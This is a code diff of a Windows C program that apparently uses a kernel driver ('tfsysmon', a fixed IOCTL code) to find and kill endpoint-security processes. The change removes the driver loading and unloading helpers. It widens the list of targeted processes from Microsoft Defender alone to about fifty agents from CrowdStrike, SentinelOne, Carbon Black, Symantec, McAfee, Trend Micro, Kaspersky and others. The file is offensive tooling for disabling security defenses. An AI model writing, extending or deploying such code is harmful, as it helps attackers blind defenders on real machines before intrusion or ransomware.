@@ -10,15 +10,7 @@
 #define DRIVER_NAME L"tfsysmon"
 #define IOCTL_CODE 0xB4A00404
 
-const wchar_t* edrNames[] = {
-        L"MsMpEng.exe",
-        L"SecurityHealthService.exe",
-        L"SecurityHealthSystray.exe",
-        L"MsSense.exe",
-        L"SenseNdr.exe",
-        L"SenseTVM.exe",
-        L"NisSrv.exe"
-};
+const wchar_t* edrNames[] = { L"MsMpEng.exe", L"SecurityHealthService.exe", L"SecurityHealthSystray.exe", L"MsSense.exe", L"SenseNdr.exe", L"SenseTVM.exe", L"NisSrv.exe", L"MpCmdRun.exe", L"MpSigStub.exe", L"ConfigSecurityPolicy.exe", L"smartscreen.exe", L"CSFalconService.exe", L"CSFalconContainer.exe", L"CSAgent.exe", L"falcon-sensor.exe", L"SentinelAgent.exe", L"SentinelAgentWorker.exe", L"SentinelServiceHost.exe", L"SentinelStaticEngine.exe", L"cb.exe", L"cbstream.exe", L"carbonblack.exe", L"RepMgr.exe", L"RepUtils.exe", L"RepUx.exe", L"ccSvcHst.exe", L"SymCorpUI.exe", L"SEPM.exe", L"SmcGui.exe", L"smc.exe", L"ccApp.exe", L"McShield.exe", L"mfevtps.exe", L"mfeann.exe", L"mcapexe.exe", L"ModuleCoreService.exe", L"mfemms.exe", L"PccNTMon.exe", L"ntrtscan.exe", L"tmlisten.exe", L"CNTAoSMgr.exe", L"TmCCSF.exe", L"avp.exe", L"kavtray.exe", L"klnagent.exe", L"ksde.exe", L"cytray.exe", L"cyserver.exe", L"CyveraService.exe", L"xagt.exe", L"fe_avk.exe", L"HX.exe" };
 
 const size_t edrCount = sizeof(edrNames) / sizeof(edrNames[0]);
 
@@ -54,112 +46,8 @@ DWORD FindEDR(const wchar_t* processName) {
     return processId;
 }
 
-void LoadDriver(const wchar_t* DRIVER_PATH) {
-    SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
-    if (scmHandle == NULL) {
-        printf("[-] Failed to open Service Control Manager.\n");
-        return;
-    }
-
-    SC_HANDLE serviceHandle = CreateService(
-        scmHandle,
-        DRIVER_NAME,             // Service name
-        DRIVER_NAME,             // Display name
-        SERVICE_START,           // Desired access permissions
-        SERVICE_KERNEL_DRIVER,   // Service type
-        SERVICE_DEMAND_START,    // Start type
-        SERVICE_ERROR_IGNORE,    // Ignore errors if the service fails
-        DRIVER_PATH,             // Path to driver file
-        NULL, NULL, NULL, NULL, NULL
-    );
-
-    if (serviceHandle == NULL) {
-        // Check if the service already exists
-        if (GetLastError() == ERROR_SERVICE_EXISTS) {
-            printf("[+] Service already exists, attempting to start.\n");
-            serviceHandle = OpenService(scmHandle, DRIVER_NAME, SERVICE_START);
-        }
-        else {
-            printf("[-] Failed to create service.\n");
-            CloseServiceHandle(scmHandle);
-            return;
-        }
-    }
-
-    // Attempt to start the service
-    BOOL status = StartService(serviceHandle, 0, NULL);
-    if (status) {
-        printf("[+] Started service successfully!\n");
-    }
-    else if (status == ERROR_SERVICE_ALREADY_RUNNING) {
-        printf("[+] Service is already running...\n");
-    }
-    else {
-        printf("[-] Failed to start the service, error: 0x%08X\n", GetLastError());
-    }
-    // Clean up handles
-    CloseServiceHandle(serviceHandle);
-    CloseServiceHandle(scmHandle);
-}
-
-void UnloadDriver() {
-    // Open the Service Control Manager with full access
-    SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
-    if (scmHandle == NULL) {
-        printf("[-] Failed to open Service Control Manager.\n");
-        return;
-    }
-    // Open the driver service with permission to stop and delete
-    SC_HANDLE serviceHandle = OpenService(scmHandle, DRIVER_NAME, SERVICE_STOP | DELETE);
-    if (serviceHandle == NULL) {
-        printf("[-] Failed to open service.\n");
-        CloseServiceHandle(scmHandle);
-        return;
-    }
-
-    // Stop the driver service
-    SERVICE_STATUS status;
-    if (ControlService(serviceHandle, SERVICE_CONTROL_STOP, &status)) {
-        printf("[+] Driver stopped successfully.\n");
-    }
-    else {
-        printf("[-] Failed to stop service.\n");
-    }
-
-    // Delete the driver service
-    if (DeleteService(serviceHandle)) {
-        printf("[+] Service deleted successfully.\n");
-    }
-    else {
-        printf("[-] Failed to delete service.\n");
-    }
-    // Clean up handles
-    CloseServiceHandle(serviceHandle);
-    CloseServiceHandle(scmHandle);
-}
-
-void Cleanup(int sig) {
-    wprintf(L"[+] Pressed Ctrl+C...\n");
-    // Put your cleanup code here
-    UnloadDriver();
-    exit(0); // Exit the program gracefully
-}
-
 int wmain(int argc, wchar_t* argv[])
 {
-    // Load or Start the Driver
-    if (argc >= 2 && (wcscmp(argv[1], L"-h") == 0 || wcscmp(argv[1], L"--help") == 0)) {
-        wprintf(L"[+] Usage: %ls -l/--load <driver.sys>\n", argv[0]);
-        return 0;
-    }
-
-    if (argc == 3 && (wcscmp(argv[1], L"-l") == 0 || wcscmp(argv[1], L"--load") == 0)) {
-        wchar_t fullPath[MAX_PATH];
-        DWORD length = GetFullPathNameW(argv[2], MAX_PATH, fullPath, NULL);
-        printf("[+] Attempting to load the driver\n");
-        LoadDriver(fullPath);
-        signal(SIGINT, Cleanup);
-    }
 
     printf("[+] Opening handle to device..\n");
     HANDLE hDriver = CreateFileW(
